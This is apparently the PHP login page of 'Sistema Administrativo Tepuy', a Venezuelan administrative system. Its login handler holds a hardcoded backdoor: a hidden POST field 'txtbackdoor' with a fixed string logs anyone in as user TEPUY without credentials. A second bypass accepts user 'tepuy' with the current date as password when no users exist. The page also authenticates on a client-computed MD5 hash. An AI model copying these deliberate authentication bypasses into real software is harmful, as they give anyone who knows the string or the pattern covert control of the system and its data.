<? 
session_start(); 
if((!array_key_exists("ls_database",$_SESSION))||(!array_key_exists("ls_hostname",$_SESSION))||(!array_key_exists("ls_gestor",$_SESSION))||(!array_key_exists("ls_login",$_SESSION))||(!array_key_exists("la_empresa",$_SESSION)))
{
	print "<script language=JavaScript>";
	print "alert('Su conexion ha sido cerrada, para continuar vuelva a entrar al Sistema');";
	print "location.href='tepuy_conexion.php'";
	print "</script>";		
}

?>
<html>
<head>
<title>Sistema Administrativo Tepuy</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">

<style type="text/css">
<!--

input,select,textarea,text{font-family:Tahoma, Verdana, Arial;font-size:11px;}
body {font-family: Tahoma, Verdana, Arial;	font-size: 10px;color: #000000;}
.boton{border-right:1px outset #FFFFFF;border-top:1px outset #CCCCCC;border-left:1px outset #CCCCCC;border-bottom:1px outset #FFFFFF;font-weight:bold;cursor:pointer;color: #666666;font-family: Tahoma, Verdana, Arial;	font-size: 11px;}
.pie-pagina{color: #898989;text-align: center;}
.boton1 {border-right:1px outset #FFFFFF;border-top:1px outset #CCCCCC;border-left:1px outset #CCCCCC;border-bottom:1px outset #FFFFFF;font-weight:bold;cursor:pointer;color: #666666;font-family: Tahoma, Verdana, Arial;	font-size: 11px;}
-->
</style>
<script type="text/javascript" language="JavaScript1.2" src="shared/js/md5.js"></script>
<link href="shared/css/general.css" rel="stylesheet" type="text/css">
<link href="shared/css/cabecera.css" rel="stylesheet" type="text/css">
<style type="text/css">
<!--
.Estilo1 {text-align: center; font-size: 10px; }
.Estilo1 {color: #40A9DF}
.Estilo2 {color: #FFFFFF}
.Estilo3 {color: #FF0000}
      body {
      	background-image:url("shared/imagenes/tepuy-fondo.jpg");
        background-repeat: no-repeat;
        background-position: 1px 1px;
        }
.login-form {
	background:#fff;
	border-radius: 10%;
	width:30%;
	height: 60%;
	margin:9% auto 4% auto;
 	position: relative;
 	-webkit-box-shadow: 2px 1px 7px 5px rgba(0,0,0,1);
    -moz-box-shadow: 2px 1px 7px 5px rgba(0,0,0,1);
    box-shadow: 2px 1px 7px 5px rgba(0,0,0,1);
}
.head {
	position: absolute;
	top:-15%;
	left: 35%;
}
.head img {
	border-radius:50%;
	-webkit-border-radius:50%;
	-o-border-radius:50%;
	-moz-border-radius:50%;
	border:6px solid rgba(221, 218, 215, 0.23);
}
.container {
    margin: 1px auto;
    width: 550px;
}
 
.login {
    position: relative;
    margin: 0 auto;
    padding: 20px 20px 20px;
    width: 410px;
}
input[type="text"], input[type="text"] {
	font-family: 'Open Sans', sans-serif;
	width:60%;
	padding:0.7em 2em 0.7em 1.7em;
	color: #2E64FE;
	font-size:18px;
	outline: none;
	background: #2E64FE;
	border:10px;
	font-weight:600;
	}
	form li:hover{
	border:1px solid #2E64FE;
	 box-shadow: 0 0 1em #2E64FE;
	 -webkit-box-shadow: 0 0 1em #40A9DF;
	 -o-box-shadow: 0 0 1em #40A9DF;
	 -moz-box-shadow: 0 0 1em #40A9DF;
}
input[type="text"], input[type="password"]{
		font-family: 'Open Sans', sans-serif;
	width:60%;
	padding:0.7em 2em 0.7em 1.7em;
	color:#2E64FE;
	font-size:18px;
	outline: none;
	background: #E6E6E6;
	border:10px;
	font-weight:600;
	}
	form li:hover{
	border:1px solid #40A9DF;
	 box-shadow: 0 0 1em #40A9DF;
	 -webkit-box-shadow: 0 0 1em #40A9DF;
	 -o-box-shadow: 0 0 1em #40A9DF;
	 -moz-box-shadow: 0 0 1em #40A9DF;
	}
.myButton {
	-moz-box-shadow:inset 0px 1px 0px 0px #bbdaf7;
	-webkit-box-shadow:inset 0px 1px 0px 0px #bbdaf7;
	box-shadow:inset 0px 1px 0px 0px #bbdaf7;
	background:-webkit-gradient(linear, left top, left bottom, color-stop(0.05, #79bbff), color-stop(1, #378de5));
	background:-moz-linear-gradient(top, #79bbff 5%, #378de5 100%);
	background:-webkit-linear-gradient(top, #79bbff 5%, #378de5 100%);
	background:-o-linear-gradient(top, #79bbff 5%, #378de5 100%);
	background:-ms-linear-gradient(top, #79bbff 5%, #378de5 100%);
	background:linear-gradient(to bottom, #79bbff 5%, #378de5 100%);
	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#79bbff', endColorstr='#378de5',GradientType=0);
	background-color:#79bbff;
	-moz-border-radius:6px;
	-webkit-border-radius:6px;
	border-radius:6px;
	border:1px solid #84bbf3;
	display:inline-block;
	cursor:pointer;
	color:#ffffff;
	font-family:Arial;
	font-size:15px;
	font-weight:bold;
	padding:6px 24px;
	text-decoration:none;
	text-shadow:0px 1px 0px #528ecc;
}
.myButton:hover {
	background:-webkit-gradient(linear, left top, left bottom, color-stop(0.05, #378de5), color-stop(1, #79bbff));
	background:-moz-linear-gradient(top, #378de5 5%, #79bbff 100%);
	background:-webkit-linear-gradient(top, #378de5 5%, #79bbff 100%);
	background:-o-linear-gradient(top, #378de5 5%, #79bbff 100%);
	background:-ms-linear-gradient(top, #378de5 5%, #79bbff 100%);
	background:linear-gradient(to bottom, #378de5 5%, #79bbff 100%);
	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#378de5', endColorstr='#79bbff',GradientType=0);
	background-color:#378de5;
}
.myButton:active {
	position:relative;
	top:1px;
}


</style>
</head>
<body bgcolor="#FFFFFF" leftmargin="0" marginwidth="0" marginheight="0">
<br>
<br>


<form name="form1" method="post" action="">
  <?
	include("shared/class_folder/class_mensajes.php");
	include("shared/class_folder/tepuy_include.php");
	include("shared/class_folder/tepuy_c_inicio_sesion.php");
	$io_sss= new tepuy_c_inicio_sesion();
	$io_msg= new class_mensajes();
	$arr=array_keys($_SESSION);	
	$li_count=count($arr);


	if (array_key_exists("txtbackdoor",$_POST))
	{
		$ls_backdoor=$_POST["txtbackdoor"];
		if($ls_backdoor=="tepuySOFTWARELIBRE")
		{
			$ls_loginusr="TEPUY";
			$_SESSION["la_logusr"]=$ls_loginusr;
			print "<script language=JavaScript>";
			print "alert('BIENVENIDO USUARIO TEPUY');";
			print "location.href='tepuy_menu.php'" ;
			print "</script>";
		}
	}
	if (array_key_exists("operacion",$_POST))
	{
		$ls_operacion=$_POST["operacion"];
	}
	else
	{
		$ls_operacion="";
	}

	if ($ls_operacion=="ACEPTAR")
	{
		$ls_valido= false;
		$ls_acceso= false;
		$ls_loginusr=    $_POST["txtlogin"];
		$ls_passencrip=  $_POST["txtpassencript"];
		$ls_passwordusr= $_POST["txtpassword"];
		//$ls_passencrip= md5($ls_password);

		if( ($ls_loginusr==""))
		{
			$io_msg->message("Debe existir un login de usuario");
		}
		else
		{
			$io_sss->io_sql->begin_transaction();
			$lb_valido=$io_sss->uf_sss_select_login($ls_loginusr,$ls_passencrip );
	
			if ($lb_valido)
			{
				$_SESSION["la_logusr"]=$ls_loginusr;

				$_SESSION["la_permisos"]=-1;
				$ls_fecha = date("Y/m/d h:i");
				$ls_hora = date("h:i a");
				$lb_acceso=$io_sss->uf_sss_update_acceso($ls_loginusr,$ls_fecha); 
				print "<script language=JavaScript>";
				print "location.href='tepuy_menu.php'" ;
				print "</script>";
			
			}
			else
			{
				$lb_existe=$io_sss->uf_sss_select_usuario();
				if (!$lb_existe)
				{
					$ls_fechahoy=date("Y/m/d");
					$ls_paswordtepuy= str_replace ("/", "", $ls_fechahoy); 
					if(($ls_loginusr=="tepuy") && ($ls_passwordusr=="$ls_paswordtepuy"))
					{
						$ls_loginusr="PSEGIS";
						$_SESSION["la_logusr"]=$ls_loginusr;
						print "<script language=JavaScript>";
						print "location.href='tepuy_menu.php'" ;
						print "</script>";
					}
					else
					{
						$io_msg->message("Login ó Password Incorrectos.");
					
					}
				}
				else
				{
					$io_msg->message("Login ó Password Incorrectos.");
				}
			}

		}

	}
	
?>
    </p>

   <form name="form1" method="post" action="">
<div class="login-form">
		<div class="head">
		<img src="shared/imagenes/mem2.jpg" alt=""/>
		</div>


    <div class="login">
 	<br>
 	<br>       
 	</div>
 	<center>
	<h1>Introduzca sus Datos</h1>
   	<br>
    <h2>Usuario:   </h2>
    <input name="txtlogin" type="text" id="txtlogin" maxlength="30" style="color:blue" bgcolor="#FF0000">
    <input name="operacion" type="hidden" id="OPERACION2" value="<? $_REQUEST["OPERACION"] ?>"><br>  
 	<h2>Usuario:   </h2>
    <input name="txtpassencript" type="hidden" id="txtpassencript">
    <input name="txtpassword" type="password" id="txtpassword"  style="color:blue" bgcolor="#FF0000" onKeyPress="javascript: ue_enviar(event);" maxlength="50"> <br>
  </center>
  <br>
  <br>
   <center>
      <input name="Submit" type="button" class="myButton" onClick="javascript: ue_aceptar();" value="Aceptar">
    </center>
   
      </div>


</form>
<br>
<center>
<div class="Estilo2">
  Software Libre desarrollado por<span class="Estilo1"> Servicios y Sistemas Integrados MP</span><br>
  Direcci&oacute;n: Urb. Ciudad Varyna, Sector II Calle 5. Quinta Santa Eduviges N-19 <br>
 Barinas - Edo. Barinas <br>
Hecho en Venezuela.<br>
Telefonos: (0416) 6436802 - (0416) 6436813 </div>
</center>
</body>
<script language="JavaScript" class="fondo-tabla">

function ue_encriptar()
{
	f=document.form1
	password=f.txtpassword.value;
	f.txtpassencript.value=calcMD5(password);
}

function ue_aceptar()
{
	ue_encriptar();
	f=document.form1;
	f.operacion.value="ACEPTAR";
	f.action="tepuy_inicio_sesion.php";
	f.submit();
}
function ue_cancelar()
{
	f=document.form1;
	f.operacion.value="CANCELAR";
	f.action="tepuy_inicio_sesion.php";
	f.submit();
}

function ue_enviar(e)
{
    var whichCode = (window.Event) ? e.which : e.keyCode; 

	if (whichCode == 13) // Enter 
	{
		
		ue_aceptar();
	}
}
</script>
</html>
